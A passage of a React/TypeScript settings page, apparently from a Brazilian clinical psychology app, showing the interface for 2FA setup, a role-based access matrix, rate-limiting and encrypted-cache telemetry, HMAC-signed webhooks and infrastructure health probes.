              className="inline-flex items-center gap-2 px-5 py-2.5 rounded-xl bg-teal-600 hover:bg-teal-700 text-white font-semibold text-sm shadow-md shadow-teal-600/20 transition-all active:scale-95 disabled:opacity-50"
            >
              {loading ? <RefreshCw className="w-4 h-4 animate-spin" /> : <ShieldCheck className="w-4 h-4" />}
              <span>Configurar e Ativar 2FA Agora</span>
            </button>
          )}

          {/* Modal / Formulário de Setup 2FA */}
          {setupStep === 'scanning' && (
            <div className="p-6 rounded-2xl bg-slate-50 dark:bg-slate-800/50 border border-slate-200 dark:border-slate-700 space-y-6 animate-fade-in">
              <div className="grid md:grid-cols-2 gap-6 items-center">
                <div className="flex flex-col items-center p-4 bg-white dark:bg-slate-900 rounded-2xl border border-slate-200 dark:border-slate-800 shadow-inner">
                  {qrCodeDataUrl ? (
                    <img src={qrCodeDataUrl} alt="QR Code Google Authenticator" className="w-48 h-48 rounded-lg" />
                  ) : (
                    <div className="w-48 h-48 flex items-center justify-center text-slate-400 text-xs">
                      Gerando QR Code...
                    </div>
                  )}
                  <span className="text-[11px] text-slate-500 dark:text-slate-400 mt-2">
                    Escaneie com Google Authenticator ou Authy
                  </span>
                </div>

                <div className="space-y-4">
                  <div>
                    <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                      Chave Secreta Base32 (Entrada Manual):
                    </label>
                    <div className="flex items-center gap-2">
                      <code className="flex-1 px-3 py-2 bg-slate-100 dark:bg-slate-900 rounded-xl text-xs font-mono text-teal-700 dark:text-teal-300 border border-slate-200 dark:border-slate-700 select-all">
                        {totpSecret}
                      </code>
                      <button
                        type="button"
                        onClick={copySecretToClipboard}
                        className="p-2 rounded-xl border border-slate-200 dark:border-slate-700 hover:bg-slate-200 dark:hover:bg-slate-800 text-slate-600 dark:text-slate-300"
                        title="Copiar Chave"
                      >
                        {copiedSecret ? <CheckCircle2 className="w-4 h-4 text-emerald-500" /> : <Copy className="w-4 h-4" />}
                      </button>
                    </div>
                  </div>

                  <form onSubmit={handleVerify2FA} className="space-y-3">
                    <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300">
                      Digite o código de 6 dígitos gerado no app:
                    </label>
                    <div className="flex gap-2">
                      <input
                        type="text"
                        maxLength={6}
                        placeholder="Ex: 123456"
                        value={verifyCode}
                        onChange={(e) => setVerifyCode(e.target.value.replace(/\D/g, ''))}
                        className="w-36 px-3 py-2 rounded-xl text-center text-lg font-mono font-bold tracking-widest bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-slate-900 dark:text-white focus:ring-2 focus:ring-teal-500"
                      />
                      <button
                        type="submit"
                        disabled={loading || verifyCode.length !== 6}
                        className="px-4 py-2 rounded-xl bg-teal-600 hover:bg-teal-700 text-white font-semibold text-xs shadow-md disabled:opacity-50"
                      >
                        {loading ? 'Validando...' : 'Verificar e Salvar'}
                      </button>
                    </div>
                  </form>
                </div>
              </div>

              {/* Códigos de Backup */}
              {backupCodes.length > 0 && (
                <div className="p-4 rounded-xl bg-teal-50/60 dark:bg-teal-950/30 border border-teal-200 dark:border-teal-800/60 space-y-2">
                  <div className="flex items-center gap-2 text-teal-800 dark:text-teal-300 text-xs font-bold">
                    <KeyRound className="w-4 h-4" />
                    Códigos de Backup de Uso Único (Guarde com segurança):
                  </div>
                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                    {backupCodes.map((c, i) => (
                      <code key={i} className="px-2 py-1 bg-white dark:bg-slate-900 rounded-lg text-center text-xs font-mono text-slate-700 dark:text-slate-300 border border-slate-200 dark:border-slate-800">
                        {c}
                      </code>
                    ))}
                  </div>
                </div>
              )}
            </div>
          )}

          {/* Estado de 2FA Já Ativo */}
          {currentUser.twoFactorEnabled && (
            <div className="flex items-center justify-between p-4 rounded-2xl bg-emerald-50/50 dark:bg-emerald-950/20 border border-emerald-200 dark:border-emerald-800">
              <div className="flex items-center gap-3">
                <CheckCircle2 className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />
                <div>
                  <h4 className="text-xs font-bold text-slate-800 dark:text-slate-200">
                    Sua conta está protegida por 2FA
                  </h4>
                  <p className="text-[11px] text-slate-500 dark:text-slate-400">
                    O acesso a prontuários SOAP, laudos e transcrições exige validação criptográfica.
                  </p>
                </div>
              </div>

              <button
                onClick={() => setShowDisableModal(true)}
                className="px-3.5 py-1.5 rounded-xl border border-rose-200 dark:border-rose-800 text-rose-700 dark:text-rose-400 hover:bg-rose-50 dark:hover:bg-rose-950/40 text-xs font-semibold"
              >
                Desativar 2FA
              </button>
            </div>
          )}
        </div>
      </div>

      {/* Card 2: Demonstração e Matriz de Permissões RBAC */}
      <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 sm:p-8 border border-slate-200 dark:border-slate-800 shadow-sm space-y-6">
        <div>
          <h2 className="text-lg font-bold text-slate-900 dark:text-white flex items-center gap-2">
            <Users className="w-5 h-5 text-teal-600 dark:text-teal-400" />
            Controle de Acesso Baseado em Função (RBAC) • RFC-001
          </h2>
          <p className="text-xs text-slate-600 dark:text-slate-400 mt-1">
            Simulador de alternância de perfil em tempo real para auditoria de segregação de dados sensíveis (LGPD Art. 11 vs CFP 001/2009).
          </p>
        </div>

        <div className="grid sm:grid-cols-4 gap-3">
          <button
            onClick={() => onSwitchRole(UserRole.PSICOLOGO_TITULAR)}
            className={`p-4 rounded-2xl border text-left transition-all ${
              currentUser.role === UserRole.PSICOLOGO_TITULAR
                ? 'bg-teal-50 border-teal-500 dark:bg-teal-950/40 dark:border-teal-500 ring-2 ring-teal-500/20'
                : 'border-slate-200 dark:border-slate-800 hover:bg-slate-50 dark:hover:bg-slate-800/40'
            }`}
          >
            <div className="text-sm font-bold text-slate-900 dark:text-white">👩‍⚕️ Psicólogo Titular</div>
            <p className="text-[11px] text-slate-500 dark:text-slate-400 mt-1">
              Acesso irrestrito a SOAP, IA clínica, laudos CFP e assinatura digital.
            </p>
          </button>

          <button
            onClick={() => onSwitchRole(UserRole.SUPERVISOR_CLINICO)}
            className={`p-4 rounded-2xl border text-left transition-all ${
              currentUser.role === UserRole.SUPERVISOR_CLINICO
                ? 'bg-teal-50 border-teal-500 dark:bg-teal-950/40 dark:border-teal-500 ring-2 ring-teal-500/20'
                : 'border-slate-200 dark:border-slate-800 hover:bg-slate-50 dark:hover:bg-slate-800/40'
            }`}
          >
            <div className="text-sm font-bold text-slate-900 dark:text-white">👨‍🏫 Supervisor Clínico</div>
            <p className="text-[11px] text-slate-500 dark:text-slate-400 mt-1">
              Supervisão de prontuários e rascunhos, sem poder de selo direto em nome de terceiros.
            </p>
          </button>

          <button
            onClick={() => onSwitchRole(UserRole.RECEPCAO_SECRETARIA)}
            className={`p-4 rounded-2xl border text-left transition-all ${
              currentUser.role === UserRole.RECEPCAO_SECRETARIA
                ? 'bg-teal-50 border-teal-500 dark:bg-teal-950/40 dark:border-teal-500 ring-2 ring-teal-500/20'
                : 'border-slate-200 dark:border-slate-800 hover:bg-slate-50 dark:hover:bg-slate-800/40'
            }`}
          >
            <div className="text-sm font-bold text-slate-900 dark:text-white">📋 Recepção / Secretária</div>
            <p className="text-[11px] text-slate-500 dark:text-slate-400 mt-1">
              Acesso estrito à Agenda e Contatos. Bloqueio automático de prontuários clínicos.
            </p>
          </button>

          <button
            onClick={() => onSwitchRole(UserRole.ADMIN)}
            className={`p-4 rounded-2xl border text-left transition-all ${
              currentUser.role === UserRole.ADMIN
                ? 'bg-teal-50 border-teal-500 dark:bg-teal-950/40 dark:border-teal-500 ring-2 ring-teal-500/20'
                : 'border-slate-200 dark:border-slate-800 hover:bg-slate-50 dark:hover:bg-slate-800/40'
            }`}
          >
            <div className="text-sm font-bold text-slate-900 dark:text-white">🔐 Administrador TI</div>
            <p className="text-[11px] text-slate-500 dark:text-slate-400 mt-1">
              Auditoria imutável WORM, monitoramento de Rate Limiting e segurança.
            </p>
          </button>
        </div>

        {/* Matriz Visual */}
        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs border-collapse">
            <thead>
              <tr className="border-b border-slate-200 dark:border-slate-800 text-slate-500 dark:text-slate-400">
                <th className="py-2.5 font-semibold">Recurso / Ação</th>
                <th className="py-2.5 font-semibold">Psicólogo Titular</th>
                <th className="py-2.5 font-semibold">Supervisor</th>
                <th className="py-2.5 font-semibold">Recepção / Secretária</th>
                <th className="py-2.5 font-semibold">Admin TI</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-100 dark:divide-slate-800/60 text-slate-700 dark:text-slate-300">
              <tr>
                <td className="py-2.5 font-medium">Agenda & Google Meet</td>
                <td className="py-2.5 text-emerald-600 font-bold">✓ Permitido</td>
                <td className="py-2.5 text-emerald-600 font-bold">✓ Permitido</td>
                <td className="py-2.5 text-emerald-600 font-bold">✓ Permitido</td>
                <td className="py-2.5 text-emerald-600 font-bold">✓ Permitido</td>
              </tr>
              <tr>
                <td className="py-2.5 font-medium">Cadastro / Busca de Pacientes</td>
                <td className="py-2.5 text-emerald-600 font-bold">✓ Permitido</td>
                <td className="py-2.5 text-emerald-600 font-bold">✓ Permitido</td>
                <td className="py-2.5 text-emerald-600 font-bold">✓ Permitido</td>
                <td className="py-2.5 text-emerald-600 font-bold">✓ Permitido</td>
              </tr>
              <tr>
                <td className="py-2.5 font-medium">Prontuário & Notas SOAP (§3.4)</td>
                <td className="py-2.5 text-emerald-600 font-bold">✓ Total</td>
                <td className="py-2.5 text-teal-600 font-bold">✓ Leitura / Rascunho</td>
                <td className="py-2.5 text-rose-600 font-bold">✗ Bloqueado (403)</td>
                <td className="py-2.5 text-slate-400">✗ Bloqueado</td>
              </tr>
              <tr>
                <td className="py-2.5 font-medium">Transcrição & Diarização de Áudio (§3.3)</td>
                <td className="py-2.5 text-emerald-600 font-bold">✓ Total</td>
                <td className="py-2.5 text-teal-600 font-bold">✓ Total</td>
                <td className="py-2.5 text-rose-600 font-bold">✗ Bloqueado (403)</td>
                <td className="py-2.5 text-slate-400">✗ Bloqueado</td>
              </tr>
              <tr>
                <td className="py-2.5 font-medium">Emissão de Laudos CFP nº 006/2019</td>
                <td className="py-2.5 text-emerald-600 font-bold">✓ Total</td>
                <td className="py-2.5 text-slate-400">✗ Co-validação</td>
                <td className="py-2.5 text-rose-600 font-bold">✗ Bloqueado (403)</td>
                <td className="py-2.5 text-slate-400">✗ Bloqueado</td>
              </tr>
              <tr>
                <td className="py-2.5 font-medium">Trilha de Auditoria WORM (§4.4)</td>
                <td className="py-2.5 text-emerald-600 font-bold">✓ Consulta Própria</td>
                <td className="py-2.5 text-slate-400">✗ Bloqueado</td>
                <td className="py-2.5 text-rose-600 font-bold">✗ Bloqueado (403)</td>
                <td className="py-2.5 text-emerald-600 font-bold">✓ Total</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>

      {/* Card 3: Infraestrutura de Segurança: Rate Limiting Distribuído & Cache Criptográfico em Memória (Opção I) */}
      <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 sm:p-8 border border-slate-200 dark:border-slate-800 shadow-sm space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-100 dark:border-slate-800">
          <div>
            <h2 className="text-lg font-bold text-slate-900 dark:text-white flex items-center gap-2">
              <Server className="w-5 h-5 text-teal-600 dark:text-teal-400" />
              Rate Limiting Distribuído & Cache Criptográfico em RAM • RFC-001 Opção I
            </h2>
            <p className="text-xs text-slate-600 dark:text-slate-400 mt-1">
              Proteção contra brute force distribuído com suporte a clusters e cache seguro volátil cifrado com AES-256-GCM.
            </p>
          </div>

          {currentUser.role === UserRole.ADMIN && (
            <button
              onClick={fetchInfraStatus}
              disabled={loadingInfra}
              className="inline-flex items-center gap-2 px-3 py-1.5 rounded-xl border border-slate-200 dark:border-slate-800 text-slate-600 dark:text-slate-300 hover:bg-slate-50 dark:hover:bg-slate-800 text-xs font-semibold cursor-pointer disabled:opacity-50"
              title="Atualizar Telemetria de Infraestrutura"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${loadingInfra ? 'animate-spin' : ''}`} />
              <span>Atualizar Métricas</span>
            </button>
          )}
        </div>

        {currentUser.role !== UserRole.ADMIN ? (
          <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-700 text-xs text-slate-500 dark:text-slate-400 flex items-center gap-3">
            <Lock className="w-4 h-4 text-slate-400 shrink-0" />
            <span>
              A telemetria de rate limiting e cache em memória é de visualização restrita ao perfil <strong>Administrador TI</strong>.
            </span>
          </div>
        ) : (
          <div className="grid lg:grid-cols-2 gap-6">
            {/* Bloco 1: Rate Limiting Distribuído */}
            <div className="p-5 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-700 space-y-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2 text-sm font-bold text-slate-900 dark:text-white">
                  <Zap className="w-4 h-4 text-amber-500" />
                  <span>Motor de Rate Limiting</span>
                </div>
                <span className={`px-2.5 py-1 rounded-full text-[11px] font-bold border ${
                  rateLimitStatus?.storeType === 'redis'
                    ? 'bg-emerald-500/10 text-emerald-700 dark:text-emerald-300 border-emerald-500/20'
                    : 'bg-teal-500/10 text-teal-700 dark:text-teal-300 border-teal-500/20'
                }`}>
                  {rateLimitStatus?.storeType === 'redis' ? '⚡ Redis Cluster Distribuído' : '🛡️ In-Memory Fallback Local'}
                </span>
              </div>

              <div className="grid grid-cols-2 gap-3 text-xs">
                <div className="p-3 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800">
                  <span className="text-[10px] text-slate-400 uppercase font-semibold block">Chaves Monitoradas:</span>
                  <span className="text-base font-bold text-slate-900 dark:text-white">
                    {rateLimitStatus?.totalTrackedKeys ?? 0} registros
                  </span>
                </div>
                <div className="p-3 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800">
                  <span className="text-[10px] text-slate-400 uppercase font-semibold block">Status da Conexão:</span>
                  <span className="text-base font-bold text-emerald-600 dark:text-emerald-400">
                    {rateLimitStatus?.redisConnected ? 'Conectado' : 'Ativo (Local)'}
                  </span>
                </div>
              </div>

              {/* Tabela de Presets */}
              <div>
                <span className="text-[11px] font-semibold text-slate-700 dark:text-slate-300 block mb-2">
                  Políticas de Proteção Ativas:
                </span>
                <div className="space-y-1.5 text-[11px]">
                  <div className="flex justify-between p-2 rounded-lg bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800">
                    <span className="text-slate-600 dark:text-slate-400">🔐 Login & 2FA (Brute Force):</span>
                    <strong className="text-slate-900 dark:text-white">5 req / 60s</strong>
                  </div>
                  <div className="flex justify-between p-2 rounded-lg bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800">
                    <span className="text-slate-600 dark:text-slate-400">🔍 Busca CPF (Blind Index):</span>
                    <strong className="text-slate-900 dark:text-white">30 req / 60s</strong>
                  </div>
                  <div className="flex justify-between p-2 rounded-lg bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800">
                    <span className="text-slate-600 dark:text-slate-400">📄 Validação QR Code Pública:</span>
                    <strong className="text-slate-900 dark:text-white">20 req / 60s</strong>
                  </div>
                  <div className="flex justify-between p-2 rounded-lg bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800">
                    <span className="text-slate-600 dark:text-slate-400">📅 Agendamento Online (Anti-Spam):</span>
                    <strong className="text-slate-900 dark:text-white">15 req / 60s</strong>
                  </div>
                </div>
              </div>

              {/* Formulário de Reset Administrativo */}
              <form onSubmit={handleResetRateLimit} className="pt-2 border-t border-slate-200 dark:border-slate-700">
                <label className="block text-[11px] font-semibold text-slate-700 dark:text-slate-300 mb-1">
                  Desbloqueio Administrativo (IP ou Chave Específica):
                </label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    placeholder="Ex: 192.168.1.1 ou vazio para TODOS"
                    value={resetKeyInput}
                    onChange={(e) => setResetKeyInput(e.target.value)}
                    className="flex-1 px-3 py-1.5 rounded-xl bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white"
                  />
                  <button
                    type="submit"
                    disabled={loadingInfra}
                    className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-800 dark:bg-slate-700 hover:bg-slate-900 text-white text-xs font-semibold cursor-pointer disabled:opacity-50"
                  >
                    <Unlock className="w-3 h-3" />
                    <span>Resetar</span>
                  </button>
                </div>
              </form>
            </div>

            {/* Bloco 2: Cache Criptográfico em Memória (RAM AES-256-GCM) */}
            <div className="p-5 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-700 space-y-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2 text-sm font-bold text-slate-900 dark:text-white">
                  <Cpu className="w-4 h-4 text-teal-600 dark:text-teal-400" />
                  <span>Cache Criptográfico em RAM</span>
                </div>
                <span className="px-2.5 py-1 rounded-full text-[11px] font-bold bg-emerald-500/10 text-emerald-700 dark:text-emerald-300 border border-emerald-500/20">
                  🔒 AES-256-GCM Protegido
                </span>
              </div>

              <div className="grid grid-cols-2 gap-3 text-xs">
                <div className="p-3 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800">
                  <span className="text-[10px] text-slate-400 uppercase font-semibold block">Itens Cifrados em RAM:</span>
                  <span className="text-base font-bold text-slate-900 dark:text-white">
                    {cacheStats?.itemsInMemoryEncrypted ?? 0} objetos
                  </span>
                </div>
                <div className="p-3 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800">
                  <span className="text-[10px] text-slate-400 uppercase font-semibold block">Taxa de Acerto (Hit Ratio):</span>
                  <span className="text-base font-bold text-teal-600 dark:text-teal-400">
                    {cacheStats?.hitRatio ?? 0}%
                  </span>
                </div>
              </div>

              <div className="p-3 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 space-y-2 text-xs">
                <div className="flex justify-between text-slate-500 dark:text-slate-400">
                  <span>Memória Cifrada Estimada:</span>
                  <strong className="text-slate-900 dark:text-white">{cacheStats?.memorySizeBytesEstimate ?? 0} bytes</strong>
                </div>
                <div className="flex justify-between text-slate-500 dark:text-slate-400">
                  <span>Idade da DEK Atual em RAM:</span>
                  <strong className="text-slate-900 dark:text-white">{cacheStats?.keyRotationAgeSeconds ?? 0}s</strong>
                </div>
                <div className="flex justify-between text-slate-500 dark:text-slate-400">
                  <span>Total de Hits / Misses:</span>
                  <strong className="text-slate-900 dark:text-white">{cacheStats?.hits ?? 0} / {cacheStats?.misses ?? 0}</strong>
                </div>
              </div>

              <div className="pt-2 border-t border-slate-200 dark:border-slate-700 space-y-2">
                <p className="text-[11px] text-slate-500 dark:text-slate-400">
                  Todos os dados voláteis são cifrados com chave de 256 bits gerada em RAM. Dumps de memória nunca expõem texto plano de pacientes.
                </p>
                <button
                  type="button"
                  onClick={handleRotateCacheKey}
                  disabled={loadingInfra}
                  className="w-full inline-flex items-center justify-center gap-2 px-3 py-2 rounded-xl bg-teal-600 hover:bg-teal-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer disabled:opacity-50"
                >
                  <RotateCcw className="w-3.5 h-3.5" />
                  <span>Rotacionar DEK em RAM Agora</span>
                </button>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Card 4: Webhooks Assinados HMAC-SHA256 & Notificações de Segurança (Opção J & LGPD Art. 48) */}
      <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 sm:p-8 border border-slate-200 dark:border-slate-800 shadow-sm space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-100 dark:border-slate-800">
          <div>
            <h2 className="text-lg font-bold text-slate-900 dark:text-white flex items-center gap-2">
              <Bell className="w-5 h-5 text-indigo-600 dark:text-indigo-400" />
              Webhooks de Segurança & SIEM (HMAC-SHA256) • RFC-001 Opção J
            </h2>
            <p className="text-xs text-slate-600 dark:text-slate-400 mt-1">
              Comunicação canônica de incidentes de segurança (LGPD Art. 48), restaurações de backup e exportações de dados para sistemas externos.
            </p>
          </div>

          {currentUser.role === UserRole.ADMIN && (
            <div className="flex items-center gap-2">
              <button
                onClick={fetchWebhooks}
                disabled={loadingWebhooks}
                className="p-2 rounded-xl border border-slate-200 dark:border-slate-800 text-slate-600 dark:text-slate-300 hover:bg-slate-50 dark:hover:bg-slate-800 text-xs font-semibold cursor-pointer disabled:opacity-50"
                title="Atualizar Webhooks"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${loadingWebhooks ? 'animate-spin' : ''}`} />
              </button>

              <button
                onClick={() => setShowCreateWebhookModal(true)}
                className="inline-flex items-center gap-1.5 px-3.5 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer"
              >
                <Plus className="w-3.5 h-3.5" />
                <span>Novo Webhook</span>
              </button>
            </div>
          )}
        </div>

        {currentUser.role !== UserRole.ADMIN ? (
          <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-700 text-xs text-slate-500 dark:text-slate-400 flex items-center gap-3">
            <Lock className="w-4 h-4 text-slate-400 shrink-0" />
            <span>
              O gerenciamento de endpoints de webhooks e segredos criptográficos HMAC-SHA256 é restrito ao perfil <strong>Administrador TI</strong>.
            </span>
          </div>
        ) : loadingWebhooks && webhooks.length === 0 ? (
          <div className="p-12 text-center text-slate-500 text-xs">Carregando inscrições de webhooks...</div>
        ) : webhooks.length === 0 ? (
          <div className="p-8 text-center text-slate-500 dark:text-slate-400 text-xs bg-slate-50 dark:bg-slate-800/30 rounded-2xl border border-slate-200 dark:border-slate-800">
            Nenhum webhook cadastrado ainda. Clique em "Novo Webhook" para configurar o primeiro endpoint.
          </div>
        ) : (
          <div className="space-y-4">
            {webhooks.map((w) => (
              <div 
                key={w.id} 
                className="p-5 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-700 space-y-3 transition-all hover:border-slate-300 dark:hover:border-slate-600"
              >
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                  <div className="flex items-center gap-2">
                    <span className="font-mono text-xs font-bold text-slate-900 dark:text-white truncate max-w-md">
                      {w.url}
                    </span>
                    <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold ${
                      w.enabled 
                        ? 'bg-emerald-500/10 text-emerald-700 dark:text-emerald-300 border border-emerald-500/20' 
                        : 'bg-slate-200 dark:bg-slate-700 text-slate-600 dark:text-slate-400'
                    }`}>
                      {w.enabled ? 'Ativo' : 'Pausado'}
                    </span>
                    {w.lastDeliveryStatus && (
                      <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold ${
                        w.lastDeliveryStatus === 'SUCCESS'
                          ? 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400'
                          : 'bg-rose-500/10 text-rose-600 dark:text-rose-400'
                      }`}>
                        Última Entrega: {w.lastDeliveryStatus}
                      </span>
                    )}
                  </div>

                  <div className="flex items-center gap-2">
                    <button
                      onClick={() => handleTestWebhook(w.id)}
                      disabled={testingWebhookId === w.id}
                      className="inline-flex items-center gap-1 px-3 py-1.5 rounded-xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 text-slate-700 dark:text-slate-200 hover:bg-slate-100 dark:hover:bg-slate-800 text-xs font-semibold cursor-pointer disabled:opacity-50"
                      title="Dispara evento de teste simulado com assinatura HMAC-SHA256"
                    >
                      <Send className={`w-3 h-3 ${testingWebhookId === w.id ? 'animate-spin' : ''}`} />
                      <span>{testingWebhookId === w.id ? 'Testando...' : 'Testar Envio HMAC'}</span>
                    </button>

                    <button
                      onClick={() => handleDeleteWebhook(w.id)}
                      className="p-1.5 rounded-xl border border-slate-200 dark:border-slate-800 text-rose-600 dark:text-rose-400 hover:bg-rose-50 dark:hover:bg-rose-950/40 cursor-pointer"
                      title="Remover Webhook"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                    </button>
                  </div>
                </div>

                <p className="text-xs text-slate-600 dark:text-slate-400">{w.description}</p>

                {/* Eventos inscritos */}
                <div className="flex flex-wrap items-center gap-1.5 pt-1">
                  <span className="text-[11px] text-slate-400 font-medium mr-1">Eventos:</span>
                  {w.events.map((ev) => (
                    <span 
                      key={ev} 
                      className="px-2 py-0.5 rounded-lg text-[10px] font-mono font-semibold bg-indigo-50 dark:bg-indigo-950/50 text-indigo-700 dark:text-indigo-300 border border-indigo-200 dark:border-indigo-800/60"
                    >
                      {ev}
                    </span>
                  ))}
                </div>

                {/* Segredo HMAC com cópia */}
                <div className="flex items-center gap-2 pt-2 border-t border-slate-200 dark:border-slate-700/60 text-xs">
                  <span className="text-[11px] text-slate-400 font-medium">Segredo HMAC (Signing Secret):</span>
                  <code className="px-2 py-1 bg-white dark:bg-slate-900 rounded-lg font-mono text-[11px] text-slate-700 dark:text-slate-300 border border-slate-200 dark:border-slate-800 select-all">
                    {w.secret.slice(0, 10)}••••••••••••••••{w.secret.slice(-6)}
                  </code>
                  <button
                    onClick={() => copySecret(w.secret)}
                    className="p-1 rounded-lg border border-slate-200 dark:border-slate-800 hover:bg-slate-200 dark:hover:bg-slate-800 text-slate-600 dark:text-slate-300 cursor-pointer"
                    title="Copiar segredo completo"
                  >
                    {copiedWebhookSecret === w.secret ? (
                      <CheckCircle2 className="w-3.5 h-3.5 text-emerald-500" />
                    ) : (
                      <Copy className="w-3.5 h-3.5" />
                    )}
                  </button>
                  <span className="text-[10px] text-slate-400 ml-auto font-mono">
                    X-TerapiaInFoco-Signature: t=...,v1=...
                  </span>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Card 5: Saúde da Infraestrutura, Liveness & Readiness Probes (Opção L - RFC-001 §5.2 e 12-Factor App) */}
      <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 sm:p-8 border border-slate-200 dark:border-slate-800 shadow-sm space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-100 dark:border-slate-800">
          <div>
            <h2 className="text-lg font-bold text-slate-900 dark:text-white flex items-center gap-2">
              <Activity className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />
              Saúde da Infraestrutura, Liveness & Readiness Probes • RFC-001 Opção L
            </h2>
            <p className="text-xs text-slate-600 dark:text-slate-400 mt-1">
              Sondas ativas do ciclo de vida de containers (Kubernetes/Railway), inspeção multi-dependências e telemetria de runtime Bun.
            </p>
          </div>

          {currentUser.role === UserRole.ADMIN && (
            <button
              onClick={fetchProbes}
              disabled={loadingProbes}
              className="inline-flex items-center gap-2 px-3.5 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-semibold shadow-sm transition-all cursor-pointer disabled:opacity-50"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${loadingProbes ? 'animate-spin' : ''}`} />
              <span>{loadingProbes ? 'Executando Probes...' : 'Executar Probes Agora'}</span>
            </button>
          )}
        </div>

        {currentUser.role !== UserRole.ADMIN ? (
          <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-700 text-xs text-slate-500 dark:text-slate-400 flex items-center gap-3">
            <Lock className="w-4 h-4 text-slate-400 shrink-0" />
            <span>
              A telemetria detalhada de infraestrutura e execução de readiness probes é restrita ao perfil <strong>Administrador TI / DPO</strong>.
            </span>
          </div>
        ) : loadingProbes && !readinessProbe ? (
          <div className="p-12 text-center text-slate-500 text-xs">Inspecionando dependências do sistema em tempo real...</div>
        ) : (
          <div className="space-y-5">
            {/* Visão Geral & Telemetria do Processo */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
              {/* Status Global */}
              <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/50 border border-slate-200 dark:border-slate-700 space-y-1">
                <span className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Status Geral</span>
                <div className="flex items-center gap-2">
                  <span className={`w-2.5 h-2.5 rounded-full animate-pulse ${
                    readinessProbe?.status === 'healthy' 
                      ? 'bg-emerald-500' 
                      : readinessProbe?.status === 'degraded' 
                        ? 'bg-amber-500' 
                        : 'bg-rose-500'
                  }`} />
                  <span className="font-bold text-sm text-slate-900 dark:text-white capitalize">
                    {readinessProbe?.status === 'healthy' ? 'Operacional' : readinessProbe?.status === 'degraded' ? 'Degradado' : 'Crítico'}
                  </span>
                </div>
                <p className="text-[10px] text-slate-500 font-mono">Latência: {readinessProbe?.overallLatencyMs || 0}ms</p>
              </div>

              {/* Uptime do Processo */}
              <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/50 border border-slate-200 dark:border-slate-700 space-y-1">
                <span className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Tempo Ativo (Uptime)</span>
                <p className="font-bold text-sm text-slate-900 dark:text-white font-mono">
                  {livenessProbe?.system.uptimeFormatted || '0s'}
                </p>
                <p className="text-[10px] text-slate-500 font-mono">PID {livenessProbe?.system.pid || process.pid}</p>
              </div>

              {/* Memória RAM RSS */}
              <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/50 border border-slate-200 dark:border-slate-700 space-y-1">
                <span className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Memória RAM (RSS)</span>
                <p className="font-bold text-sm text-slate-900 dark:text-white font-mono">
                  {livenessProbe?.system.memory.rssMb || 0} MB
                </p>
                <p className="text-[10px] text-slate-500 font-mono">Heap: {livenessProbe?.system.memory.heapUsedMb || 0} MB</p>
              </div>

              {/* Runtime & Engine */}
              <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/50 border border-slate-200 dark:border-slate-700 space-y-1">
                <span className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Engine / Runtime</span>
